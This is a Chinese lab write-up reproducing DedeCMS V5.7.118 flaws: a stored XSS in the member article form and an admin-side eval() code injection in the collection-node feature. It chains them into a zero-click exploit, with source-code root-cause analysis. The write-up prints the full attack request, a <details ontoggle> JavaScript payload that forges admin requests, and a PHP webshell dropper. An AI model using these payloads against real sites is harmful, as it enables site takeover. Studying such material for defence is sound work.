---

title: "DedeCMS-V5.7.118 漏洞复现"
date: 2026-03-07T10:00:00+08:00
categories:

  - "代码审计"

---

# 参考文章：

[[0day\]织梦DedeCMS 0click劫持导致的前台rce getshell](https://zhihao.org.cn/?p=202)



# 环境搭建：
源码下载：

[https://www.dedecms.com/download](https://www.dedecms.com/download)

按照 readme.txt 进行安装：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916997.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916361.png)





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915641.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917798.png)







# 前置准备：


首先需要注册一个账号，

默认会员功能是关闭的，建议将其开启：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915685.png)

包括会员使用权限也可以关闭，不然后续会很麻烦

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917499.png)



[http://dedecms:9876/member/index.php](http://dedecms:9876/member/index.php)

在该页面进行注册







# 漏洞 1 - 前台 XSS


## 相关设置
在写文章的过程中，有“隶属栏目”是必选项，但是默认不存在任何栏目，需要管理员在后台添加：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916172.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917341.png)





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915730.png)



## 漏洞复现
功能点：/member/article_add.php



标题和内容写入 XSS payload：`<img src=x onerror=alert(document.cookie)>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917630.png)



当然，直接在此处编辑的内容都会被转义，**前端富文本编辑器会自动将 `<`编码为 `&lt;`**，需要用 Burp Suite 等工具直接构造 POST 请求，绕过前端编码。发送到服务器的数据已经“变形”了，所以最好是抓包后进行修改：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916105.png)



对 body 处进行写入 payload：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915371.png)



成功发布文章

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916201.png)



访问对应的文章：/plus/view.php?aid={id}

可以看到触发了 XSS 漏洞：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916594.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915794.png)





## 漏洞分析
用户登录后，访问 /member/article_add.php 进行发布文章，拦截 POST 请求之后，对数据包中的 body 和 title ，写入 payload：`<img src=b onerror=alert('xss')>`（payload 构造后续分析），在服务器返回响应的过程中，代码是如何实现的？





uploads/member/article_add.php

在提交 POST 请求时可以注意到有 dopost  save 字段

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916814.png)

源码中也存在对应的代码

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915918.png)



也就是说用户： POST (dopost=save)

-> <font style="color:#080808;background-color:#ffffff;">include(DEDEMEMBER.'/inc/archives_check.php');</font>   **此处是执行过滤的关键点**

-> 处理附加表字段 ($dede_addonfields)



跟进：/inc/archives_check.php

重点关注以下四行：

```php
$title = cn_substrR(HtmlReplace($title,1),$cfg_title_maxlen);
$writer =  cn_substrR(HtmlReplace($writer,1),20);

$description = cn_substrR(HtmlReplace($description,1),250);
$keywords = cn_substrR(HtmlReplace($tags,1),30);
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915841.png)

这些都是对**用户输入的数据**调用`**HtmlReplace()**`函数进行处理



### 过滤函数 HtmlReplace()
继续跟进`**HtmlReplace()**`

uploads/include/helpers/filter.helper.php

```php
/**
 *  去除html中不规则内容字符

 *
 * @access    public
 * @param     string  $str  需要处理的字符串
 * @param     string  $rptype  返回类型
 *            $rptype = 0 表示仅替换 html标记
 *            $rptype = 1 表示替换 html标记同时去除连续空白字符
 *            $rptype = 2 表示替换 html标记同时去除所有空白字符
 *            $rptype = -1 表示仅替换 html危险的标记 
 * @return    string
 */
if ( ! function_exists('HtmlReplace'))
{
    // 接收俩个参数，$str要处理的字符串；$rptype为处理模式，默认为0
    function HtmlReplace($str,$rptype=0)
    {
        // 移除字符串中的反斜杠转义（如 \' → '）。说明传入的字符串可能已经被 addslashes 处理过
        $str = stripslashes($str);
        //用正则删除 <style>...</style> 及 </style> 标签（含标签属性）
    		$str = preg_replace("/<[\/]{0,1}style([^>]*)>(.*)<\/style>/i", '', $str);//2011-06-30 禁止会员投稿添加css样式 (by:DedeCMS团队)
       ......
      //对处理结果再次加反斜杠转义
        return addslashes($str);
    }
}
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916456.png)



$rptype = 0 表示仅替换 html标记

`dede_htmlspecialchars()`的作用是对字符`< > " ' &`进行转义

```php
if($rptype==0)
        {
            $str = dede_htmlspecialchars($str);
        }


function dede_htmlspecialchars($str) {
    global $cfg_soft_lang;
     // PHP < 5.4：直接调用，不指定编码
    if (version_compare(PHP_VERSION, '5.4.0', '<')) return htmlspecialchars($str, ENT_QUOTES);
    // PHP >= 5.4 且 gb2312 编码：用 ISO-8859-1 避免中文被吞
    if ($cfg_soft_lang=='gb2312') return htmlspecialchars($str, ENT_QUOTES, 'ISO-8859-1');
    // PHP >= 5.4 且 UTF-8：默认编码(UTF-8)
    else return htmlspecialchars($str, ENT_QUOTES);
}

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070914120.png)





<font style="color:rgb(41, 41, 41);">$rptype = 1 表示替换 html标记同时去除连续空白字符</font>

```php
else if($rptype==1)
        {
            $str = dede_htmlspecialchars($str);
            // 全角空格 → 半角空格
            $str = str_replace("　", ' ', $str);
            // 多个连续空白合并为一个空格
            $str = preg_replace("/[\r\n\t ]{1,}/", ' ', $str);
        }
```



$rptype = 2 表示替换 html标记同时去除所有空白字符

```php
else if($rptype==2)
        {
            $str = dede_htmlspecialchars($str);
            $str = str_replace("　", '', $str);
            $str = preg_replace("/[\r\n\t ]/", '', $str);
        }
```



$rptype = -1 表示仅替换 html 危险的标记

```php
else
        {
            $str = preg_replace("/[\r\n\t ]{1,}/", ' ', $str);
            $str = preg_replace('/script/i', 'ｓｃｒｉｐｔ', $str);
            $str = preg_replace("/<[\/]{0,1}(link|meta|ifr|fra)[^>]*>/i", '', $str);
        }
```

> ###   rptype = -1 存在很大的安全隐患
>   - 未过滤的标签：<img>、<svg>、<video>、<audio>、<details> 等
>
>   - 未过滤的属性：所有 on* 事件处理器（onerror、onload、ontoggle 等）
>
>   - 未调用 dede_htmlspecialchars()，< > 原样保留
>



###  $body 的处理
知道了过滤函数后，需要对用户输入的数据进行分析，判断其如何处理、如何绕过过滤函数。



找到对 $body 参数的处理，同样调用了 HtmlReplace 函数，过滤模式为 仅替换 html 危险的标记

```php
$body = AnalyseHtmlBody($body, $description);
$body = HtmlReplace($body, -1);
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917942.png)



`$body = AnalyseHtmlBody($body, $description);`这一步是对<font style="color:#080808;background-color:#ffffff;">HTML文本、自动摘要、自动获取缩略图等进行处理，不涉及 XSS 过滤</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917862.png)



之后进入：`$body = HtmlReplace($body, -1);`

在此模式下仅过滤 script/link/meta/ifr/fra，所以 XSS 还是有希望的





然后 $body 被存入数据库（附加表），并且可以携带恶意代码：

```php
 $inquery = "INSERT INTO `{$addtable}`(aid,typeid,userip,redirecturl,templet,body{$inadd_f}) Values('$arcID','$typeid','$userip','','','$body'{$inadd_v})";
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918947.png)



最后当我们去访问文章时，`plus/view.php?aid={id}`该路径从数据库进行读取，在前端进行渲染，触发 XSS 代码。



### 总结漏洞利用链
1. **入口：**`**member/article_add.php (dopost=save)**`

 用户 POST 提交文章，$body 包含恶意 HTML。需使用 Burp/curl 直接发包，绕过前端编辑器的实体编码转义。

2. **过滤：**`**HtmlReplace($body, -1)**`

  rptype=-1 进入 else 分支，仅做三项处理：

+ 合并空白字符
+ "script" → 全角 "ｓｃｒｉｐｔ"
+ 删除 link/meta/ifr/fra 标签

  未调用 dede_htmlspecialchars()，未过滤 `/`

  Payload：

+ img 不在黑名单
+ onerror 不含 "script"
+ < > 未被转义，原样通过
3. **存储：**`**INSERT INTO dede_addonarticle(..., body)**`

  恶意代码原样写入数据库。

4. **触发：**`**plus/view.php?aid={id}**`

  从数据库读取 body 内容，未做二次编码，直接渲染到 HTML 页面。浏览器解析`<img src=x>`，加载失败触发 `onerror`，执行`alert(document.cookie)`。

  存储型 XSS 攻击成功。



**漏洞根因：** `HtmlReplace()` 在 `rptype=-1` 时采用不完善的黑名单策略，且未对 HTML 特殊字符做实体编码，导致大量可执行脚本的 HTML 标签和事件属性未被过滤。





# 漏洞 2 - 后台 RCE


## 漏洞复现
来到后台 - 采集 - 采集节点管理 - 增加新节点 

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918908.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918551.png)

其他内容随意填写，**编码要选择 UTF8**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915513.png)

保存信息

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917498.png)

预览网址：

预览网址的域名必须和 DedeCMS 站点一致，路径可以随便写（404 也行），但域名不能错。

  比如我的站点是 [http://dedecms:9876](http://dedecms:9876)，那预览网址就填： [http://dedecms:9876/test.html](http://dedecms:9876/test.html)  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916241.png)

自定义处理接口 要写入 webshell

```php
$file = '../shell.php';
$code = '<?php @eval($_POST["cmd"]); ?>';
if (!is_writable('.')) {
exit('!w');
}
if (file_put_contents($file, $code) === false) {
exit('!f');
}
echo "OK:$file";
?>

```

```php
$file = 'shell.php';
$code = '<?php @eval($_POST["cmd"]); ?>';
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917776.png)



保存配置并预览：成功上传 shell.php

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915212.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918720.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915470.png)





## 漏洞分析
### 通过搜索危险函数确定入口点
在 php 代码的审计中，当然不可能一行一行代码的看过去，所以对危险函数进行搜索至关重要。

那么通过搜索`eval(`，找到 uploads/include/dedecollection.class.php 文件：

`eval()` 是 PHP 中最危险的函数之一，能执行任意代码。发现它就要追问：$phpcode 从哪来？用户能控制吗？并且此处的 eval  仅做变量替换，无任何安全过滤

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915206.png)



追踪函数`RunPHP()`

```php
$v = $this->RunPHP($sarr['v'],$sarr['f']);
```

显然参数 $phpcode 对应的是 $sarr['f']，继续寻找 $sarr['f'] 的来源

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917777.png)

 $sarr 来自 $tmpLtKeys

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916705.png)

继续寻找 $sarr 发现是 artNotes

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915217.png)

因为 $sarr['function'] 参数还有一个 function，所以 artNotes 也应该提供 function，继续进行搜索`function`

找到 LoadItemConfig 函数，也就是从 $configString 字符串中解析出来的 function 

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917689.png)

继续跟进 LoadItemConfig 函数，发现是从数据库里载入了一个节点

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916234.png)

现在已经明确：`$configString` 就是数据库表 `#@__co_note` 的 `itemconfig`字段。

### 追踪谁向数据库写入了 itemconfig
下一步就是去找哪里向数据库写入了 `itemconfig`

全局搜索谁对 co_note 表的 itemconfig 做了 INSERT 或 UPDATE：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916217.png)



uploads/dede/co_add.php

关键代码：

```plain
{dede:function}".$GLOBALS["function_".$field]."{/dede:function}
```

` $GLOBALS["function_".$field]` 直接对应用户 POST 提交的表单参数 `function_title`、`function_body` 等，没有任何过滤，直接拼入 `itemconfig` 存入数据库。<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917924.png)



用户 POST function_xxx → co_add.php 拼接 → 写入 DB itemconfig → LoadItemConfig 解析 → artNotes['function'] → RunPHP() → eval()

 从 eval() 一路回溯到用户输入，中间零过滤，这一条链路的分析已经完成。

### 写入点分析
全局搜索 itemconfig 时搜出了多个写入点，`co_edit.php、co_edit_text.php、co_get_corule.php` 属于同一个漏洞的不同触发路径



```plain
require_once(dirname(__FILE__)."/config.php");
CheckPurview('co_AddNote');
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916397.png)



 step=5  拼接字符串 $itemconfig，其中直接包含用户提交的 function_ 字段内容  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916788.png)

引入类文件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915851.png)

接下来就是 `dedecollection.class.php LoadItemConfig()`从 `$itemconfig` 中提取 `function` 字段，在后续执行`eval()`。



### 总结利用链
#### 阶段1 — 恶意代码存储                                                                                                   
入口文件：uploads/dede/co_add.php（step=5）                                                                  

权限检查：`CheckPurview('co_AddNote')`，需要后台管理员权限，无 CSRF Token 校验。

用户通过 POST 提交表单参数 function_xxx（如 function_title、function_body），在第 170 行被直接拼入 $itemconfig 字符串：

` {dede:function}".$GLOBALS["function_".$field]."{/dede:function}`

将 $itemconfig 直接写入数据库，零过滤：

`$dsql->ExecuteNoneQuery("UPDATE `#@__co_note` SET itemconfig='$itemconfig' WHERE nid='$nid' ");`



同一漏洞的其他写入路径：

  - co_edit.php：编辑采集规则，同样通过 function_xxx 参数写入

  - co_edit_text.php：专家模式，textarea 直接编辑整个 itemconfig 原文写入

  - co_get_corule.php：导入采集规则，从 textarea 粘贴的配置文本中解析写入



####  阶段2 — 恶意代码触发
触发文件：uploads/dede/co_gather_start_action.php

调用 `$co->LoadNote($nid)`，从数据库读取 itemconfig 字段，进入 `dedecollection.class.php` 的 `LoadItemConfig()` 方法，在第 229 行解析出` {dede:function}` 标签内容，存入`$this->artNotes[$field]['function']`。

  之后调用 `$co->DownUrl()`，进入 GetPageFields() 方法，在检测到 function 字段非空后，将其存入 `$tmpLtKeys[$k]['f']`。

  调用 `$this->RunPHP($sarr['v'], $sarr['f'])`，执行：`eval($phpcode.";");`



####  漏洞本质
从用户 POST 输入到 eval() 执行，全链路零过滤、零白名单、零沙箱。虽然需要后台管理员权限，但由于无 CSRF 防护，攻击者可构造恶意页面诱导已登录管理员访问，间接注入恶意 PHP 代码，在下次采集执行时触发任意命令执行。



# xss+后台rce组合拳 0click 劫持 导致的前台 rce getshell


## 漏洞复现


随便注册一个账号：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917429.png)

选择发表文章 /member/article_add.php

这里随便填入内容，并进行抓包

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918733.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917166.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918799.png)



对数据包进行修改，在内容处插入 payload：

```html
POST /member/article_add.php HTTP/1.1
Host: dedecms:9876
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Origin: http://dedecms:9876
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVkolGBB9b1qYBTzr
Cookie: PHPSESSID=ul9tip0bsccgfh7o1bbptnmn24; last_vtime=1772843080; last_vtime1BH21ANI1AGD297L1FF21LN02BGE1DNG=f041b308abf3db0b; last_vid=test5; last_vid1BH21ANI1AGD297L1FF21LN02BGE1DNG=b46b29d071147f62; DedeUserID=5; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0094c7a94e5c063a; DedeLoginTime=1772843088; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=080132e7d52f0730; ENV_GOBACK_URL=%2Fmember%2Fcontent_list.php%3Fchannelid%3D1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dedecms:9876/member/article_add.php
Accept-Encoding: gzip, deflate
Content-Length: 1298

------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="dopost"

save
------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="channelid"

1
------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="title"

test555
------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="tags"


------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="writer"

test5
------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="typeid"

1
------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="mtypesid"

0
------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="description"


------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="litpic"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="dede_addonfields"


------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="dede_fieldshash"

e794e87a4f831953cdc022fbfa042ff6
------WebKitFormBoundaryVkolGBB9b1qYBTzr
Content-Disposition: form-data; name="body"

<details open ontoggle="fetch('/dede/co_add.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'channelid=1&step=2&dopost=preview&notename=short'}).then(r=>r.text()).then(t=>{console.log(t);let m=t.match(/name='nid' value='(.*?)'/);if(m){let nid=m[1];alert(nid);fetch('/dede/co_add.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'nid='+nid+'&channelid=1&step=5&previewurl=http%3A%2F%2Fdedecms:9876%2Ftest.html&sppage=&sptype=full&srul=1&erul=5&keywordtrim=&descriptiontrim=&fields[]=title&match_title=%3Ctitle%3E%5B%E5%86%85%E5%AE%B9%5D%3C%2Ftitle%3E&trim_title=&fields[]=writer&match_writer=&trim_writer=&fields[]=source&match_source=&trim_source=&fields[]=pubdate&match_pubdate=&trim_pubdate=&function_pubdate=%40me%3DGetMkTime%28%40me%29%3B&fields[]=body&value_body=&match_body=&isunit_body=1&isdown_body=1&trim_body=&function_body=%24file%20%3D%20%27..%2Fshell.php%27%3B%0D%0A%24code%20%3D%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22cmd%22%5D%29%3B%20%3F%3E%27%3B%0D%0Aif%20%28%21is_writable%28%27.%27%29%29%20%7B%0D%0A%09exit%28%27%21w%27%29%3B%0D%0A%7D%0D%0Aif%20%28file_put_contents%28%24file%2C%20%24code%29%20%3D%3D%3D%20false%29%20%7B%0D%0A%09exit%28%27%21f%27%29%3B%0D%0A%7D%0D%0Aecho%20%27OK%3A%27%20.%20%24file%3B%0D%0A%3F%3E&b12=%E4%BF%9D%E5%AD%98%E9%85%8D%E7%BD%AE%E5%B9%B6%E9%A2%84%E8%A7%88'}).then(r=>r.text()).then(res=>console.log(res))}})" hidden><summary></summary></details>
------WebKitFormBoundaryVkolGBB9b1qYBTzr--

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916878.png)



在后台管理页面中，test555 是插入 payload 的文章

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915664.png)



管理员打开文章后弹出弹窗，并且在网站根目录下生成 shell.php

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915135.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915341.png)





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917201.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917659.png)







## payload 分析
### 完整 payload：
```php
<details open ontoggle="                                                                                                                                                                              
    fetch('/dede/co_add.php', {                                                                                                                                                                       
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'channelid=1&step=2&dopost=preview&notename=short'
    })
    .then(r => r.text())
    .then(t => {
      console.log(t);
      let m = t.match(/name='nid' value='(.*?)'/);
      if(m) {
        let nid = m[1];
        alert(nid);
        
        let params = 'nid=' + nid
          + '&channelid=1&step=5'
          + '&previewurl=http%3A%2F%2Fdedecms:9876%2Ftest.html'
          + '&sppage=&sptype=full&srul=1&erul=5'
          + '&keywordtrim=&descriptiontrim='
          + '&fields[]=title&match_title=%3Ctitle%3E%5B%E5%86%85%E5%AE%B9%5D%3C%2Ftitle%3E&trim_title='
          + '&fields[]=writer&match_writer=&trim_writer='
          + '&fields[]=source&match_source=&trim_source='
          + '&fields[]=pubdate&match_pubdate=&trim_pubdate='
          + '&function_pubdate=%40me%3DGetMkTime%28%40me%29%3B'
          + '&fields[]=body&value_body=&match_body=&isunit_body=1&isdown_body=1&trim_body='
          + '&function_body=%24file%20%3D%20%27..%2Fshell.php%27%3B%0D%0A%24code%20%3D%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22cmd%22%5D%29%3B%20%3F%3E%27%3B%0D%0Aif%20%28%21is_writable%28%27.%27%29%
  29%20%7B%0D%0A%09exit%28%27%21w%27%29%3B%0D%0A%7D%0D%0Aif%20%28file_put_contents%28%24file%2C%20%24code%29%20%3D%3D%3D%20false%29%20%7B%0D%0A%09exit%28%27%21f%27%29%3B%0D%0A%7D%0D%0Aecho%20%27OK%3A%
  27%20.%20%24file%3B'
          + '&b12=%E4%BF%9D%E5%AD%98%E9%85%8D%E7%BD%AE%E5%B9%B6%E9%A2%84%E8%A7%88';

        fetch('/dede/co_add.php', {
          method: 'POST',
          credentials: 'include',
          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
          body: params
        })
        .then(r => r.text())
        .then(res => console.log(res))
      }
    })"
  hidden>
    <summary></summary>
  </details>

```

```html
外层 HTML — XSS 触发器：                                                                       
  <details open ontoggle="[JAVASCRIPT]" hidden>
    <summary></summary>                                                                                                                                                                                 
  </details>
                                                                                                                                                                                                        
JavaScript — 两阶段 CSRF 攻击：                                                                                                                                                                     
  // ========== 第一阶段：创建采集节点，获取 nid ==========
  fetch('/dede/co_add.php', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'channelid=1&step=2&dopost=preview&notename=short'
  })
  .then(r => r.text())
  .then(t => {
    console.log(t);
    let m = t.match(/name='nid' value='(.*?)'/);
    if (m) {
      let nid = m[1];
      alert(nid);

  // ========== 第二阶段：写入恶意 function_body ==========
      fetch('/dede/co_add.php', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'nid=' + nid + '&channelid=1&step=5&...[参数见下方]...'
      })
      .then(r => r.text())
      .then(res => console.log(res))
    }
  })

第二阶段 POST 参数（URL 解码后）：
  nid             = [从第一阶段获取]
  channelid       = 1
  step            = 5
  previewurl      = http://dedecms:9876/test.html  [此处要注意的是，预览网址的域名必须和 DedeCMS 站点一致，路径可以随便写（404 也行），但域名不能错。比如我的站点是 http://dedecms:9876，那预览网址就填： http://dedecms:9876/test.html  ]
  sppage          =
  sptype          = full
  srul            = 1
  erul            = 5
  keywordtrim     =
  descriptiontrim =

  fields[]        = title
  match_title     = <title>[内容]</title>
  trim_title      =

  fields[]        = writer
  match_writer    =
  trim_writer     =

  fields[]        = source
  match_source    =
  trim_source     =

  fields[]        = pubdate
  match_pubdate   =
  trim_pubdate    =
  function_pubdate = @me=GetMkTime(@me);

  fields[]        = body
  value_body      =
  match_body      =
  isunit_body     = 1
  isdown_body     = 1
  trim_body       =
  function_body   = [恶意代码，见下方]

  function_body 的实际内容（写入 webshell）：

  $file = '../shell.php';
  $code = '<?php @eval($_POST["cmd"]); ?>';
  if (!is_writable('.')) {
      exit('!w');
  }
  if (file_put_contents($file, $code) === false) {
      exit('!f');
  }
  echo 'OK:' . $file;
  ?>

```



### 逐层分析
#### 1. XSS 触发方式

`<details open ontoggle=...>`


    页面渲染时自动触发，不需要用户点击。管理员在后台审核文章时，打开页面即触发 ontoggle 事件执行 JavaScript。



#### 2. 第一阶段 — 创建采集节点
```php
 fetch('/dede/co_add.php', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'channelid=1&step=2&dopost=preview&notename=short'
  })
  .then(r => r.text())
  .then(t => {
    console.log(t);
    let m = t.match(/name='nid' value='(.*?)'/);
    if (m) {
      let nid = m[1];
      alert(nid);
```

  向 co_add.php 发送 step=2&dopost=preview，进入 co_add.php:95 的 else 分支，在 #@__co_note 表中 INSERT 一条新记录，返回的 HTML 中包含 name='nid' value='...'，用正则提取 nid。



#### 3. 第二阶段 — 注入恶意代码并触发执行
```php
fetch('/dede/co_add.php', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'nid=' + nid + '&channelid=1&step=5&...&function_body=...'
      })
      .then(r => r.text())
      .then(res => console.log(res))
    }
  })

  function_body 的实际内容（写入 webshell）：

  $file = '../shell.php';
  $code = '<?php @eval($_POST["cmd"]); ?>';
  if (!is_writable('.')) {
      exit('!w');
  }
  if (file_put_contents($file, $code) === false) {
      exit('!f');
  }
  echo 'OK:' . $file;
  ?>
```

  向 co_add.php 发送 step=5，此时：

  - function_body 的内容被拼入 {dede:function}...{/dede:function} 标签

  - 写入数据库 #@__co_note.itemconfig

  - 加载 co_add_step2_test.htm 模板



  模板立即执行测试：

  `$dc->LoadNote($nid);`

`  $dc->TestArt($previewurl);  // → DownUrl() → GetPageFields() → RunPHP() → eval()`





